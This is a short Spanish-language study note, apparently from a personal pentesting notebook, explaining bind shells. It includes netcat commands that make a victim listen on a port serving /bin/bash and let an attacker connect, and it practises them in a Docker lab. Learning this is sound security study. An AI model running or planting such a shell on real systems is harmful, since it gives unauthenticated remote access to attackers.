
# Indice

- [[#Introducción]]
- [[#Practica]]
- [[#Continuar apuntes]]
# Introducción

Para la Bind Shell la cosa cambia debido a que ahora la máquina víctima no entablará ningún tipo de conexión con nada. Lo que sucede ahora es que ahora la máquina víctima se pondrá en escucha ofreciendo una terminal bash; por ende, a cualquier conexión entrante le entregará una terminal y será muy similar a la reverse shell; la diferencia principal es la forma en la que sucede. 

Por ende, la máquina víctima se queda en escucha en un puerto, ofreciendo una terminal y, si recibe una conexión, le entregará la terminal.

![[Conceptos básicos de enumeración y explotación/Shells/images/010.png]]

# Practica

De esta manera, la víctima se queda en escucha de conexiones, ofreciendo una terminal:

```shell
nc -nlvp 4646 -e /bin/bash
```

Y nosotros como atacantes solo nos conectaríamos:

```shell
nc ipVictima 4646
```

De esta manera recibimos de igual forma una terminal interactiva:

![[Conceptos básicos de enumeración y explotación/Shells/images/011.png]]

![[Conceptos básicos de enumeración y explotación/Shells/images/012.png]]

Recordemos que en este caso, la IP es esta debido a que todo está corriendo en un contenedor de Docker y la interfaz Docker 0 asigna estas IP.

# Continuar apuntes

[[Introducción a Shells]]